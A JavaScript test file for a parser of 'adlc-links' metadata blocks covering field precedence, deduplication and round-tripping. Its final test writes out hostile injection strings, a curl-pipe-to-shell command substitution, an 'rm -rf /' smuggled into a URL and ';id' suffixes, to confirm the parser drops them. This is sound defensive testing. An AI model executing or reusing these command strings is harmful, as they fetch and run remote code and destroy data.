// Contract tests for the links block — the one thing that must never silently break.
// If parse/render drift apart, every downstream station starts from a wrong record.

import test from 'node:test';
import assert from 'node:assert/strict';
import { parseLinks, renderLinks } from '../scripts/links.mjs';

const BLOCK_A = `Spec proposed.

<!-- adlc-links v1
spec_pr: https://github.com/o/r/pull/12
openspec_change: openspec/changes/my-change
-->`;

const BLOCK_B = `Implementation opened.

<!-- adlc-links v1
implementation_pr: https://github.com/o/r/pull/34
-->`;

test('links: a single block parses to its fields', () => {
  assert.deepEqual(parseLinks(BLOCK_A), {
    spec_pr: 'https://github.com/o/r/pull/12',
    openspec_change: 'openspec/changes/my-change',
  });
});

test('links: later blocks win per field, implementation_pr accumulates', () => {
  const text = [
    BLOCK_A,
    BLOCK_B,
    '<!-- adlc-links v1\nspec_pr: https://github.com/o/r/pull/13\nimplementation_pr: https://github.com/o/r/pull/35\n-->',
  ].join('\n\n');
  assert.deepEqual(parseLinks(text), {
    spec_pr: 'https://github.com/o/r/pull/13',
    openspec_change: 'openspec/changes/my-change',
    implementation_pr: ['https://github.com/o/r/pull/34', 'https://github.com/o/r/pull/35'],
  });
});

test('links: duplicate implementation_pr entries collapse', () => {
  const text = BLOCK_B + '\n' + BLOCK_B;
  assert.deepEqual(parseLinks(text).implementation_pr, ['https://github.com/o/r/pull/34']);
});

test('links: text without a block parses to nothing, not an error', () => {
  assert.deepEqual(parseLinks('just a comment'), {});
  assert.deepEqual(parseLinks(''), {});
  assert.deepEqual(parseLinks(undefined), {});
});

test('links: render → parse round-trips, arrays included', () => {
  const links = {
    spec_pr: 'https://github.com/o/r/pull/12',
    openspec_change: 'openspec/changes/my-change',
    implementation_pr: ['https://github.com/o/r/pull/34', 'https://github.com/o/r/pull/35'],
    depth: '1',
  };
  assert.deepEqual(parseLinks(renderLinks(links)), links);
});

test('links: a malformed line is ignored, the rest of the block survives', () => {
  const text = '<!-- adlc-links v1\nnot a field line\nspec_pr: https://github.com/o/r/pull/9\n-->';
  assert.deepEqual(parseLinks(text), { spec_pr: 'https://github.com/o/r/pull/9' });
});

test('links: values that do not match their field shape are dropped — never passed to a shell', () => {
  const hostile = [
    '<!-- adlc-links v1',
    'implementation_pr: $(curl evil | sh)',
    'implementation_pr: https://evil.example/pull/1',
    "spec_pr: https://github.com/o/r/pull/12'; rm -rf /; '",
    'openspec_change: openspec/changes/x;id',
    'depth: two',
    'repro_run: 123; id',
    'unknown_key: anything',
    'implementation_pr: https://github.com/o/r/pull/34',
    '-->',
  ].join('\n');
  assert.deepEqual(parseLinks(hostile), {
    implementation_pr: ['https://github.com/o/r/pull/34'],
  });
});
